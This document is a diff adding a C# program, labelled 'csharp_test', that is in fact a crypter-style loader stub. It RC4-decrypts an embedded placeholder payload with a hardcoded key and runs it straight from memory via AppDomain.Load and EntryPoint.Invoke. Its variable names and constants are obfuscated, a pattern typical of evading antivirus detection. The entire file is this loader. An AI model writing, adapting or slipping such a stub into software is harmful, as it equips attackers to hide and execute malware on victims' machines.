@@ -1,0 +1,56 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Windows.Forms;
+
+namespace csharp_test
+{
+    static class Program
+    {
+        
+        [STAThread]
+        static void Main()
+        {
+
+            byte[] ont = {lol};
+            byte[] se = RC4decrypt(ont, "kkkkk");
+
+        
+            AppDomain.CurrentDomain.Load(se).EntryPoint.Invoke(984985 - 984985, null);
+            
+        }
+
+        public static byte[] RC4decrypt(byte[] D1, string D2)
+        {
+            byte[] D3 = System.Text.Encoding.ASCII.GetBytes(D2);
+            uint D4 = 0;
+            uint D5 = 0;
+            uint D6 = 0;
+            uint[] D7 = new uint[256];
+            byte[] D8 = new byte[D1.Length];
+            for (D4 = 0; D4 <= 255; D4++)
+            {
+                D7[D4] = D4;
+            }
+            for (D4 = 0; D4 <= 255; D4++)
+            {
+                D5 = (D5 + D3[D4 % D3.Length] + D7[D4]) & 255;
+                D6 = D7[D4];
+                D7[D4] = D7[D5];
+                D7[D5] = D6;
+            }
+            D4 = 0;
+            D5 = 0;
+            for (var D9 = 0; D9 < D8.Length; D9++)
+            {
+                D4 = (D4 + 1) & 255;
+                D5 = (D5 + D7[D4]) & 255;
+                D6 = D7[D4];
+                D7[D4] = D7[D5];
+                D7[D5] = D6;
+                D8[D9] = Convert.ToByte(D1[D9] ^ D7[(D7[D4] + D7[D5]) & 255]);
+            }
+            return D8;
+        }
+
+    }
+}
